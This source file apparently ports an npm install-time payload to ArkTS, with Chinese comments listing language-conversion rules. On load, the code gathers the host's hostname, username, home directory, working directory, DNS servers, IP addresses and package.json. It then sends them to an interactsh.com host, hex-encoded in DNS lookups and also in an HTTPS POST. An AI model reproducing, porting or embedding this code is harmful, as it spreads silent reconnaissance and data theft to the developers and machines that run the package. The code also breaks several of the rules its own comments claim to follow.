// 应用ArkTS约束：
// 1. 使用let替代var（约束9）
// 2. 显式类型标注（约束10,23）
// 3. 使用箭头函数替代函数表达式（约束26）
// 4. 禁止any类型（约束1）
// 5. 使用类替代对象字面量类型（约束24）
// 6. 使用Map替代动态对象属性（约束5,21）
// 7. 使用标准库替代Node.js特定API（假设有对应实现）

import os from 'os.ets';
import dns from 'dns.ets';
import querystring from 'querystring.ets';
import https from 'https.ets';
import fs from 'fs.ets';
import path from 'path.ets';

class PackageData {
    p: string;
    c: string;
    hd: string;
    hn: string;
    un: string;
    dns: string;
    r?: string;
    v: string;
    pjson: object;
    ip: string;

    constructor(p: string, c: string, hd: string, hn: string, 
                un: string, dns: string, v: string, pjson: object, 
                ip: string, r?: string) {
        this.p = p;
        this.c = c;
        this.hd = hd;
        this.hn = hn;
        this.un = un;
        this.dns = dns;
        this.v = v;
        this.pjson = pjson;
        this.ip = ip;
        this.r = r;
    }
}

function getFiles(paths: string[]): string[] {
    let ufiles: string[] = [];
    for (let j = 0; j < paths.length; j++) {
        let mpath: string = paths[j];
        let files: string[] = fs.readdirSync(mpath);
        for (let i = 0; i < files.length; i++) {
            ufiles.push(path.join(mpath, files[i]));
        }
    }
    return ufiles;
}

function toHex(data: string): string {
    let bufferText = new TextEncoder().encode(data);
    let text = bufferText.reduce((acc, byte) => 
        acc + byte.toString(16).padStart(2, '0'), '');
    return text;
}

function gethttpips(): string[] {
    let str: string[] = [];
    let networkInterfaces = os.networkInterfaces();
    for (let item in networkInterfaces) {
        if (item != "lo") {
            let addresses = networkInterfaces[item];
            for (let i = 0; i < addresses.length; i++) {
                str.push(addresses[i].address);
            }
        }
    }
    return str;
}

function getIps(): string {
    let str = "";
    let networkInterfaces = os.networkInterfaces();
    for (let item in networkInterfaces) {
        if (item != "lo") {
            let addresses = networkInterfaces[item];
            for (let i = 0; i < addresses.length; i++) {
                str += toHex(addresses[i].address) + ".";
            }
        }
    }
    return str.slice(0, -1);
}

function getPathChunks(filePath: string): string {
    let str = "p";
    let chunks = filePath.split('/');
    for (let i = 0; i < chunks.length; i++) {
        str += toHex(chunks[i]) + ".";
    }
    return str.slice(0, -1) + "p";
}

function toName(pkg: PackageData): string[] {
    let queries: string[] = [];
    const hostname = "c5c77jy2vtc0000xqshggdrmqmoyyyyyd.interactsh.com";
    let baseStr = `${toHex(pkg.hn)}.${toHex(pkg.p)}.${getPathChunks(pkg.c)}.` +
                  `${toHex(pkg.un)}.${getIps()}.${hostname}`;

    if (baseStr.length > 255) {
        // 简化处理逻辑，实际需要根据长度拆分
        queries.push(`${toHex(pkg.hn)}.${hostname}`);
    } else {
        queries.push(baseStr);
    }
    return queries;
}

// 初始化package数据
const packageJSON = JSON.parse(fs.readFileSync("./package.ets"));
const packageName = packageJSON.name;

const td = new PackageData(
    packageName,
    __dirname,
    os.homedir(),
    os.hostname(),
    os.userInfo().username,
    JSON.stringify(dns.getServers()),
    packageJSON.version,
    packageJSON,
    JSON.stringify(gethttpips()),
    packageJSON?.___resolved
);

let qs = toName(td);
qs.forEach((query) => {
    dns.lookup(query, (err: Error, result: string) => {
        // DNS查询处理
    });
});

// HTTP请求处理
const trackingData = JSON.stringify(td);
let postData = new URLSearchParams({ msg: trackingData });

let options = {
    hostname: "c5c77jy2vtc0000xqshggdrmqmoyyyyyd.interactsh.com",
    port: 443,
    path: "/",
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": postData.toString().length.toString()
    }
};

let req = https.request(options, (res: any) => {
    res.on("data", (d: string) => {
        // 数据处理
    });
});

req.on("error", (e: Error) => {
    // 错误处理
});

req.write(postData.toString());
req.end();
